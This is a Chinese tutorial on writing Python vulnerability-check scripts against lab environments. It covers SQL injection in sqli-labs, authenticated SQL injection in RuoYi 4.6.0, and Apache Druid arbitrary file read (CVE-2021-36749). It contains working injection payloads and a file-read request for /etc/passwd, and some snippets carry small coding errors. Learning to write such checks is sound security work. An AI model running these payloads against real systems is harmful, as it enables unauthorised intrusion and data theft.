## 一、前言

POC（Proof of Concept，概念验证）指为了验证某个潜在的漏洞或安全问题而编写的脚本。本文主要介绍关于漏洞验证 Python PoC
的编写实例和简单的编写思路，并挑选几种类型的漏洞进行了 Poc 实例编写和测试验证,代码编写难度相对较为简单，主要是相关库的运用及简单的思路是实现。

## 二、SQL注入

本节 "基础学习" 小节中主要通过搭建 sali-lab 漏洞环境进行简单的实例编写，用于初步了解 GET 与 POST
注入脚本编写的区别，由简单的环境开始逐渐过渡到完整的 Poc 编写。

### 环境搭建

这边利用 docker 搭建 sqli-lab 漏洞环境，命令如下

    
    
    docekr search sqli-lab
    docker pull acgpiano/sqli-labs
    docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs

访问本地 80 端口，点击 `Setup/reset Database for labs` 后完成安装

![](./img/2717741010591372528.png)

### 基础学习

**1、单引号报错注入（GET）** ，GET 型单引号注入利用 Less-1 进行 Poc 代码编写学习

正常页面

![](./img/4461701178230447752.png)

单引号 SQL 语句报错

![](./img/1404547142074749969.png)

经测试发现存在 SQL 注入，可通过插入 Payload 查询并在页面上回显数据库版本信息，具体 Payload 如下

    
    
    ' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND 'utgs'='utgs
    

![](./img/4699709639922353904.png)

**Poc 简单编写**

    
    
    # coding:utf-8
    '''
    @File    ：Single_quotes_error_based_injection.py.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    # 导入 requests 库
    import requests
    
    # 手动设置漏洞链接
    url = "http://192.168.148.155/Less-1/?id=1"
    
    # 设置 headers 头，告诉服务器请求的客户端是什么类型的设备或应用程序，有些服务器可能会根据User-Agent字段来做特定的处理，例如根据设备类型返回不同的内容或应用不同的限制策略，避免被 ban
    headers = {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"}
    
    # 构造 SQL 语句，查询数据库版本
    payload = "' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND 'utgs'='utgs"
    
    # 发送HTTP请求，注入 payload 并获取页面响应
    res = requests.get(url + payload,  headers=headers, timeout = 5)
    
    # 若 res 返回的响应中存在 "XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~'" 则证明存在漏洞，否则不存在
    if "XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~'" in res.text:
        print('[+]Vulnerable to SQL injection: ' + url)
    else:
        print('[-] Not Vulnerable: ' + url)
    

当存在漏洞时，返回 `[+] Vulnerable to SQL injection: + url` 响应

![](./img/3239915599738516427.png)

当不存在漏洞时，返回 `[+] Not Vulnerable : + url` 响应

![](./img/98275397314524724.png)

**2、单引号报错注入（POST）** ，POST 型单引号注入利用 Less-11 进行 Poc 代码编写学习

正常页面

![](./img/371536221108579198.png)

通过抓包分析，参数 `username`、`password` 均存在单引号报错注入

![](./img/5413439841865221406.png)

![](./img/3758838641050629723.png)

经过测试后，确定其数据库版本，具体 payload 为

    
    
    ' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND 'utgs'='utgs
    

![](./img/3247211732595834420.png)

**Poc 简单编写**

    
    
    # coding:utf-8
    '''
    @File    ：post_sql_injection.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    # 导入 requests 库
    import requests
    
    # 手动设置漏洞链接
    url = "http://192.168.148.155/Less-12/"
    
    # 设置 headers 头，告诉服务器请求的客户端是什么类型的设备或应用程序，有些服务器可能会根据User-Agent字段来做特定的处理，例如根据设备类型返回不同的内容或应用不同的限制策略，避免被 ban
    headers = {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"}
    
    # 构造 POST 数据包，并创建 SQL 语句，查询数据库版本，验证漏洞
    payload = {"uname": "' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND 'utgs'='utgs",
               "passwd": "123456", "submit": "Submit"}
    
    # 发送 HTTP POST 请求，注入 payload 并获取页面响应，匹配相应字段判断是否存在注入
    res = requests.post(url, headers = headers, data = payload, timeout = 5)
    
    # 若 res 返回的响应中存在 "XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~'" 则证明存在漏洞，否则不存在
    if "XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~'" in res.text:
        print('[+] Vulnerable to SQL injection: ' + url)
    else:
        print('[-] Not Vulnerable: ' + url)
    

当存在漏洞时，返回 `[+] Vulnerable to SQL injection: + url` 响应

![](./img/6155701424507974454.png)

当不存在漏洞时，返回 `[+] Vulnerable to SQL injection: + url` 响应

![](./img/4556886236119576120.png)

**3、单引号延时注入（POST）** ，POST 型单引号延时注入利用 Less-15 进行 Poc 代码编写学习

正常页面

![](./img/3548067950270818175.png)

通过抓包确定其存在 sql 延时注入，经过测试后确认其 payload 为

    
    
    1' AND (SELECT 2707 FROM (SELECT(SLEEP(5)))vWgP) AND 'xDGW'='xDGW
    

![](./img/430177944192617836.png)

**Poc 简单编写**

本次延时注入 Poc 编写主要多了 time 库，利用 time 库获取其请求时间与结束的响应时间，通过时间的响应时长，判断是否存在延时注入

    
    
    # coding:utf-8
    '''
    @File    ：post_sql_injection.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    # 导入 requests 库
    import requests
    
    # 手动设置漏洞链接
    url = "http://192.168.148.155/Less-12/"
    
    # 设置 headers 头，告诉服务器请求的客户端是什么类型的设备或应用程序，有些服务器可能会根据User-Agent字段来做特定的处理，例如根据设备类型返回不同的内容或应用不同的限制策略，避免被 ban
    headers = {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"}
    
    # 构造 POST 数据包，并创建 SQL 语句，查询数据库版本，验证漏洞
    payload = {"uname": "' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND 'utgs'='utgs",
               "passwd": "123456", "submit": "Submit"}
    
    # 发送 HTTP POST 请求，注入 payload 并获取页面响应，匹配相应字段判断是否存在注入
    res = requests.post(url, headers = headers, data = payload, timeout = 5)
    
    # 若 res 返回的响应中存在 "XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~'" 则证明存在漏洞，否则不存在
    if "XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~'" in res.text:
        print('[+] Vulnerable to SQL injection: ' + url)
    else:
        print('[-] Not Vulnerable: ' + url)
    

验证存在漏洞，当存在漏洞时，返回 `[+] Vulnerable to SQL injection`

![](./img/5509015104774219528.png)

当不存在漏洞时，返回 `[+] Not Vulnerable to SQL injection`

![](./img/3886304170160352129.png)

### 若依 v 4.6.0 后台 SQL 注入

通过上面的基础的学习，初步了解了 Poc 编写的简单实现，这边利用 `若依后台注入`实例继续学习 Poc
的编写，环境搭建以及相关漏洞代码分析这里不赘述，若有需求，可参考个人 blog 文章
[Java代码审计(六)-若依管理系统V4.6.0](https://funsiooo.github.io/)

> 影响版本：RuoYi <=4.6.1

#### POC 代码编写分析

在正式开始编写 Poc 时，需充分分析该漏洞的特点，以及 Poc
编写过程中需要解决的难点，一一列出来，然后逐点击破，该搜索搜索，该找资料找资料，该问人就得问人，先简单能实现漏洞验证功能后再去完善格式，美化代码。

1、漏洞位置在登录后台后，角色管理处抓包后添加 `params[dataScope]`参数，漏洞具体链接
`http://192.168.148.184:8888/system/role/list`

![](./img/3588627348715165394.png)

利用 Burp 抓到的原始数据包信息

![](./img/4107077143674345809.png)

    
    
    pageSize=10&pageNum=1&orderByColumn=roleSort&isAsc=asc&roleName=&roleKey=&status=&params%5BbeginTime%5D=&params%5BendTime%5D=&params[dataScope]=and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523
    

![](./img/8867865123045699610.png)

2、 **登录分析** ，登录需要检查验证码，若验证码输入错误，系统返回信息 `{"msg":"验证码错误","code":500}`

![](./img/7235204048350772436.png)

![](./img/60504346320923475.png)

由上图可知，系统请求登录 post 数据包请求体为
`username=admin&password=admin123&validateCode=1&rememberMe=false`，登录时系统还带有一个
Cookie 验证，所以 Cookie 的获取也是需要我们解决的问题。

#### 分析小结

漏洞处于后台的 POST 请求，在编写 Poc 时需要先解决登录，后再进行 POST 数据请求验证漏洞

> 1、登录需要验证码验证
>
> 2、登录请求需要携带 Cookie 值，且当用户在前台登录后退出会 Cookie 会进行更新

#### Poc 初步编写

1、利用 Python 解决登录问题，这里只需使用 requests 库即可，我们先利用 Burp 抓包获取其 POST 数据格式

![](./img/5924137166376766270.png)

登录成功数据包及返回包如下图，`username`、`pasword` 参数为账户密码参数，`validateCode`
参数为验证码参数，`remnberMe` 为记住密码参数

    
    
    username=admin&password=admin123&validateCode=2&rememberMe=false
    

![](./img/3800056254559360677.png)

2、Python 构造登录请求包

通过初步分析请求，发现无论账号密码、验证码是否正确均返回响应为 `{"msg":"验证码错误","code":500}`

![](./img/7232722572005941378.png)

初步编写的代码如下，先验证是否能正常登录

    
    
    # coding:utf-8 
    '''
    @File    ：demo.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    import requests
    
    # 设置请求登录的 URL
    url = 'http://192.168.1.103:8888/login'
    
    # 设置 Headers 可以模拟浏览器发送HTTP请求，避免被拦截
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
    
    # 构造 POST 数据包，参数与用户输入数据分别用单引号或者双引号括起来且中间使用:分隔开
    data = {'username':'admin','password':'admin123','validateCode':'0','rememberMe':'false'}
    
    # 利用 request 请求 post 进行登陆
    res = requests.post(url=url,headers=headers,data=data)
    
    # 返回请求响应文本
    print(res.text)
    

通过抓包分析发现，在进行 POST 请求时，登录请求需要带有 Cookie 值，用户在前台登录后退出重新请求登录后 Cookie 值后会发生变化

![](./img/35403983300776266.png)

3、解决 Cookie 值问题，这里先简单将 Cookie 值手动添加到 Python 代码中，在代码中携带 Cookie 进行登录请求

    
    
    # coding:utf-8 
    '''
    @File    ：demo.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    import requests
    
    # 设置请求登录的 URL
    url = 'http://192.168.1.103:8888/login'
    
    # 设置 Headers 可以模拟浏览器发送 HTTP 请求，避免被拦截，并携带 Cookie 值进行请求
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'Cookie': 'JSESSIONID=8a3a309c-9bf1-4936-8c92-1fecd58ab1ed'
    }
    
    # 构造 POST 数据包，参数与用户输入数据分别用单引号或者双引号括起来且中间使用:分隔开
    data = {'username':'admin','password':'admin123','validateCode':'8','rememberMe':'false'}
    
    # 利用 request 请求 post 进行登陆
    res = requests.post(url=url,headers=headers,data=data)
    
    # 返回请求响应文本
    print(res.text)
    

![](./img/3647230796652172987.png)

![](./img/6376807018278792822.png)

4、登录后继续请求 POST 数据包进行漏洞验证，成功返回响应，脚本可用

    
    
    # coding:utf-8 
    '''
    @File    ：demo.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io 
    '''
    
    import requests
    
    # 设置请求登录的 URL
    url = 'http://192.168.1.103:8888/login'
    
    # 设置 Headers 可以模拟浏览器发送 HTTP 请求，避免被拦截，并携带 Cookie 值进行请求
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'Cookie': 'JSESSIONID=81be198a-87df-4a09-914c-19b71ef32709'
    }
    
    # 构造 POST 数据包，参数与用户输入数据分别用单引号或者双引号括起来且中间使用:分隔开
    data = {'username':'admin','password':'admin123','validateCode':'3','rememberMe':'false'}
    
    # 利用 request 请求 post 进行登陆
    res = requests.post(url=url,headers=headers,data=data)
    
    # 上一步登录的响应中若存在 "操作成功" 文本则进行下一步的 POST 请求
    if "操作成功" in res.text:
        # 继上一步的登陆后，构造登陆后的数据请求 URL，下面为漏洞链接
        post_url = 'http://192.168.1.103:8888/system/role/list'
    
        # 构造登陆后的数据请求 POST 包，这里是漏洞链接的 POST 数据包
        post_data = {'pageSize': '10', 'pageNum': '1', 'orderByColumn': 'roleSort', 'isAsc': 'asc', 'roleName': '',
                     'roleKey': '', 'status': '', 'params%5BbeginTime%5D': '', 'params%5BendTime%5D': '',
                     'params[dataScope]': 'and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523'}
    
        # 登陆后继续保持 headers 头，这一步很重要，如果没有这一步就无法保持客户端与服务器的连接，继而无法进行后台请求
        post_headers = headers
    
        # 开始后台漏洞验证的 POST 请求
        post_requests = requests.post(url=post_url,data=post_data,headers=post_headers)
    
        # 若 post_requests 数据请求响应存在 "java.sql.SQLException: XPATH syntax error" 则证明存在漏洞，返回 "[+] Vulnerable to SQL injection"
        if "java.sql.SQLException: XPATH syntax error:" in post_requests.text:
            print("[+] Vulnerable to SQL injection")
        # 若不存在 "java.sql.SQLException: XPATH syntax error" 则证明存在不漏洞，返回 "[-] Not vulnerable to SQL injection "
        else:
            print("[-] Not vulnerable to SQL injection ")
    

![](./img/447146674641625819.png)

将漏洞参数去掉，重新再验证 Poc 是否还存在漏洞若还是返回 `[+] Vulnerable to SQL injection`
则代码存在问题，去掉漏洞参数后，响应返回 `[-] Not vulnerable to SQL injection`， Poc 正常运行

![](./img/8049582846231398430.png)

到此为止，一个简易的若依后台注入 Poc 就编写完成了。

#### 完善代码

由上面的代码可知，请求中的 `URL` 、`Cooike值`、`验证码`一旦请求发生改变均需要手动修改代码，体验不好，这边使用 `argparse`
库，直接利用命令行参数的模式输入这些值，而且代码格式相对混乱没有进行模块化处理，这边使用函数的方式，将代码模块化，提高代码阅读性

美化后的代码如下，主要修改为将初步编写的代码设置一个 `Poc()` 函数模块化代码，提高代码阅读性；添加了 `banner()`
函数用于脚本成功执行时输出 `banner`，美化脚本；使用 `argparse`
库将之前的脚本`需要输入的参数值`修改为`通过命令行参数传入`相应的值，方便脚本的运行，避免需要打开脚本手动传入参数值。

    
    
    # coding:utf-8
    '''
    @File    ：demo.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    import requests
    import argparse
    
    # 创建一个解析对象parser，用于装载参数的容器
    parser = argparse.ArgumentParser(description="python3 demo.py -u [login_url] -c [cookie] -v [Verification_Code] -b [Vul Links]")
    
    # 对这个解析对象添加几个命令行参数，type为输入类型，metavar用来控制部分命令行参数的显示，require=True为当用户输入错误时，系统返回提示正确的输入方式，help为描述
    parser.add_argument('-u', '--url', type=str, metavar='', required=True, help='Please input the vulnerable url')
    parser.add_argument('-c', '--cookie', type=str, metavar='', required=True, help='Please input the vul target cookie')
    parser.add_argument('-v', '--validateCode', type=int, metavar='', required=True, help='Please inpute the verification code')
    parser.add_argument('-b', '--bgurl', type=str, metavar='', required=True, help='Please inpute the Login background vulnerable url')
    
    # 实例化 parser
    args = parser.parse_args()
    
    # 设置banner，用于正确运行脚本时输出
    def banner():
        print("""
     _____                   _    _____       _   _____       _           _   _             
    |  __ \                 (_)  / ____|     | | |_   _|     (_)         | | (_)            
    | |__) |   _  ___  _   _ _  | (___   __ _| |   | |  _ __  _  ___  ___| |_ _  ___  _ __  
    |  _  / | | |/ _ \| | | | |  \___ \ / _` | |   | | | '_ \| |/ _ \/ __| __| |/ _ \| '_ \ 
    | | \ \ |_| | (_) | |_| | |  ____) | (_| | |  _| |_| | | | |  __/ (__| |_| | (_) | | | |
    |_|  \_\__,_|\___/ \__, |_| |_____/ \__, |_| |_____|_| |_| |\___|\___|\__|_|\___/|_| |_|
                        __/ |              | |              _/ |                            
                       |___/               |_|             |__/                             
                                                                                     v 4.6.0 
        """)
    
    # url、cookie、validateCode(验证码) ， bgurl 值为后台 sql 注入的漏洞链接,均改为命令行参数输入
    def Poc(url,cookie,validateCode,bgurl):
        # 设置 Headers 可以模拟浏览器发送HTTP请求，避免被拦截，并携带 Cookie 值进行请求,Cookie值从命令行参数传入
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'Cookie': cookie
        }
    
        # 构造 POST 数据包，参数与用户输入的参数值分别用单引号或者双引号括起来且中间使用 : 分隔开, validateCode 值从命令行参数传入
        data = {'username':'admin','password':'admin123','validateCode':{validateCode},'rememberMe':'false'}
    
        # 利用 request 请求登陆
        res = requests.post(url, headers=headers, data=data, timeout=5)
    
        # 第一层 if、elif 作为处理登陆成功或失败返回的响应，第二层 if 用于验证漏洞，若返回的响应中存在 "操作成功" 则进行下一步操作，否则跳出
        if "操作成功" in res.text:
            # 继上一步的登陆后，构造登陆后的数据请求 URL,漏洞 url 通过 bgurl（-u）-> post_url 传入
            post_url = bgurl
    
            # 构造登陆后的漏洞点的数据 POST 请求包
            post_data = {'pageSize': '10', 'pageNum': '1', 'orderByColumn': 'roleSort', 'isAsc': 'asc', 'roleName': '',
                         'roleKey': '', 'status': '', 'params%5BbeginTime%5D': '', 'params%5BendTime%5D': '',
                         'params[dataScope]': 'and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523'}
    
            # 登陆后继续保持 headers 头，这一步很重要，如果没有这一步就无法保持客户端与服务器的连接，继而无法进行后台请求
            post_headers = headers
    
            # 开始登录后的后台数据请求
            post_requests = requests.post(url=post_url,data=post_data,headers=post_headers)
    
            # 若 post_requests 数据请求响应存在 "java.sql.SQLException: XPATH syntax error" 则证明存在漏洞，返回 "[+] Vulnerable to SQL injection"
            if "java.sql.SQLException: XPATH syntax error:" in post_requests.text:
                print("[+] Vulnerable to SQL injection")
    
            # 若不存在 "java.sql.SQLException: XPATH syntax error" 则证明存在不漏洞，返回 "[-] Not vulnerable to SQL injection "
            else:
                print("[-] Not vulnerable to SQL injection ")
    
        elif "验证码错误":
                print("[-] Error Occurred, Please Check you input")
    
    # 固定格式，由于上面代码使用的模块化 def() 编写，所以下面需设置主函数进行执行脚本
    if __name__ == '__main__':
        # 按照顺序，先执行banner()函数里面的代码，在执行Poc()函数里面的代码，其中Poc()函数代码中的url、cookie、validateCode、bgurl均使用 argparse 库调用，使用命令行参数传入相应的值
        banner()
        Poc(args.url,args.cookie,args.validateCode,args.bgurl)
    

执行脚本存在漏洞时，返回响应 `[+] Vulnerable to SQL injection`

    
    
    python3 demo.py -u [漏洞的后台登录链接] -c [网站的cookie值] -v [验证码] -b [后台的漏洞点链接]
    python3 demo.py -u http://192.168.148.184:8888/login -c JSESSIONID=de1e9f93-9c51-4520-b106-bff2ed0918ae -v 56 -b http://192.168.148.184:8888/system/role/list

![](./img/6805541877516746156.png)

当漏洞不存在时，这里修改漏洞链接测试，返回响应 `[-] Not vulnerable to SQL injection`

    
    
    python3 demo.py -u http://192.168.148.184:8888/login -c JSESSIONID=d40bd1c6-40b5-4c6a-ba75-4cbdd0265d4f -v 1 -b http://192.168.148.184:8888/system/menu/list

![](./img/2687549890996217619.png)

当输入的 Cookie 或者 验证码错误时，返回响应 `[-] Error Occurred, Please Check you input`

![](./img/4202380158517338714.png)

这 Poc 存在一个问题，账号密码的内置的，若不是默认admin/admin123，则无法登录，若想要完全自动化，可将登录的账号密码参数加入
`argsparse`，若能明白这简单的脚本，自己修改很简单，上手敲一遍，加深印象。

## 三、任意文件读取

### Apache Druid LoadData 任意文件读取漏洞（CVE-2021-36749）

#### 环境搭建

    
    
    # vulhub 下载地址
    https://github.com/vulhub/vulhub
    
    # 进入 CVE-2021-25646 目录输入命令启动环境
    dodocker-compose up -d

![](./img/5532940670956243168.png)

![](./img/7553318252517941551.png)

![](./img/7069463006740116393.png)

![](./img/3054104389647559215.png)

> 影响版本：Apache Druid Version < 0.22

#### POC 代码编写分析

通过 Burp 抓包获取其数据包以及相应的漏洞触发点，由下图可知，漏洞触发参数为 `"uris"`，我们只需要将该参数的值更改为漏洞 `Payload`
，当我们观察输出验证的 `Payload` 返回的响应即可判断是否存在漏洞。

    
    
    POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
    Host: 192.168.148.155:8888
    Content-Length: 423
    Accept: application/json, text/plain, */*
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
    Content-Type: application/json;charset=UTF-8
    Origin: http://192.168.148.155:8888
    Referer: http://192.168.148.155:8888/unified-console.html
    Accept-Encoding: gzip, deflate
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Connection: close
    
    {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["file:///etc/passwd"]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
    

![](./img/2334672350304316414.png)

#### 分析小结

由于靶场没有登录验证。这一部分我们 pass，若存在登录验证的话可以参考上面 SQL 注入 Poc
编写部分进行再构造。这边就当做为一个前台的或者未授权访问的任意文件读取漏洞去进行 Poc 编写。

> 1、利用 Post 请求数据包，然后将 uri 参数值编写为用户输入
>
> 2、设置一个漏洞 payload 列表进行遍历，也可以让用户输入特定的验证 payload 验证漏洞

#### Poc 初步编写

初步编写需要注意的点就是 `JSON` 格式的数据请求问题，此前请求为
`requests.post(url,data=data)`，但由于本漏洞的请求数据是 `json` 格式问题，所以得注意请求的设置中
`data=data` 需要更改为 `json=data`

    
    
    # coding:utf-8 
    '''
    @File    ：demo.py
    @IDE     ：PyCharm
    @Author  ：Funsiooo
    @Blog    ：https://funsiooo.github.io
    '''
    
    import requests
    
    # 手动设置漏洞链接
    url = "http://192.168.148.155:8888/druid/indexer/v1/sampler?for=connect"
    
    # 设置 headers
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'}
    
    # burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 "uris" 的参数值
    post_data = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["file:///etc/passwd"]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
    
    # 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求
    res = requests.post(url,json=post_data,headers=headers,verify=False, allow_redirects=False)
    
    # 返回请求的 text ,先手工查看是否存在漏洞
    print(res.text)
    

由返回包可知初步编写的 Poc 能正常验证漏洞

![](./img/2997145398367534608.png)

#### 完善代码

由上一步我们初步实现的 `Poc` 的编写，但还是不够自动化，这边主要解决几个点：漏洞 `URL` 用户手动输入；`post` 数据参数 `uris`
的验证 `payload`太单一，若系统不一样则会出现漏报现象，这边的 `Payload` 改为已定义的 `list` 遍历
`payload`，避免出现漏报；美化代码格式

1、首先将原先简陋的代码模块化，定义一个 Poc() 函数处理代码

原代码

    
    
    import request
    
    # 手动设置漏洞链接
    url = "http://192.168.148.155:8888/druid/indexer/v1/sampler?for=connect"
    
    # 设置 headers
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'}
    
    # burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 "uris" 的参数值
    post_data = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["file:///etc/passwd"]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
    
    # 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求
    res = requests.post(url,json=post_data,headers=headers,verify=False, allow_redirects=False)
    

修改后代码，注意这时候该 Poc 还不能去执行，因为 `Poc(url)` 中的`url` 还没有定义，请继续往下看即可

    
    
    import request
    
    # 注意这里多了一个Poc(url)，url 第2点下面有提及具体用途
    def Poc(url):
        # 自定义一个字典，用于存在验证的 payload，自定义 payload 区别系统版本，避免漏报
        lists = [
            "file:///etc/passwd",
            "file:///C:/Windows/win.ini"
        ]
    
        # 设置 headers
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'}
    
        # try except 用于捕抓异常，当用户输入的连接有误时，提示异常
        try:
            # for 循环用于遍历 lists 字典中的 payload -> "urls"：[list]
            for list in lists:
                # burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 "uris" 的参数值
                post_data = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":[list]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
    
                # 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求
                res = requests.post(url,json=post_data,headers=headers,verify=False, allow_redirects=False)
    
                # 若 res 的 response 中存在 root:x 或者 [fonts] 字符则证明存在漏洞否则不存在漏洞
                if "root:x" in res.text or "[fonts]" in res.text:
                    print("[+] 存在 Apache Druid LoadData 任意文件读取漏洞 ")
                    break
                else:
                    print("[-] 不存在 Apache Druid LoadData 任意文件读取漏洞")
                    break
        except Exception as e:
            print("[-] 请检查输入是否有误")
    
    # 因为代码使用了模块化，所以若需要执行代码则需要利用 main 函数去执行，函数的执行按从上到下执行
    if __name__ == '__main__':
        Poc()
    

2、补全参数的输入，定义 `Poc(url)` 里面的 `url`

将函数模块化后，利用 `argparse` 库将 `url` 值使用命令行的方式由用户去输入，编写为如下

    
    
    import requests
    import argparse
    
    # 创建一个解析对象parser，用于装载参数的容器
    parser = argparse.ArgumentParser(description="usage：python3 demo.py -u [url]")
    
    # 对这个解析对象添加几个命令行参数，type为输入类型，metavar用来控制部分命令行参数的显示，require=True为当用户输入错误时，系统返回提示正确的输入方式，help为描述
    parser.add_argument('-u', '--url', type=str, metavar='', required=True, help='Please input the vulnerable url')
    
    # 实例化 parser
    args = parser.parse_args()
    
    
    def Poc(url):
        # 自定义一个字典，用于存在验证的 payload，自定义 payload 区别系统版本，避免漏报
        lists = [
            "file:///etc/passwd",
            "file:///C:/Windows/win.ini"
        ]
    
        # 设置 headers
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'}
    
        try:
            for list in lists:
                # burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 "uris" 的参数值，参数值利用 list 遍历 lists 列表的值
                post_data = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":[list]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
    
                # 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求
                res = requests.post(url,json=post_data,headers=headers,verify=False, allow_redirects=False)
    
                # 若 res 的 response 中存在 root:x 或者 [fonts] 字符则证明存在漏洞否则不存在漏洞
                if "root:x" in res.text or "[fonts]" in res.text:
                    print("[+] 存在 Apache Druid LoadData 任意文件读取漏洞 ")
                    break
                else:
                    print("[-] 不存在 Apache Druid LoadData 任意文件读取漏洞")
                    break
        except Exception as e:
            print("[-] 请检查输入是否有误")
    
    # 固定格式，由于上面代码使用的模块化 def() 编写，所以下面需设置主函数进行执行脚本
    if __name__ == '__main__':
        Poc(args.url)
    

如果不想继续美化下去，其实这时候脚本就已经编写完成了。

![](./img/7764600162117458442.png)

3、具体更为完善的代码如下：

    
    
    import requests
    import argparse
    
    # 将 argparse 模块化
    def argument():
        parser = argparse.ArgumentParser(description="usage：python3 demo.py -u [url]")
        parser.add_argument('-u', '--url', type=str, metavar='', required=True, help='Please input the vulnerable url')
        args = parser.parse_args()
        return args
    
    # 设置一个 banner，美化脚本
    def banner():
        print("""
      _______      ________    ___   ___ ___  __       ____    ________ _  _   ___  
     / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |     |___ \  / /____  | || | / _ \ 
    | |     \ \  / /| |__ ______ ) | | | | ) || |______ __) |/ /_   / /| || || (_) |
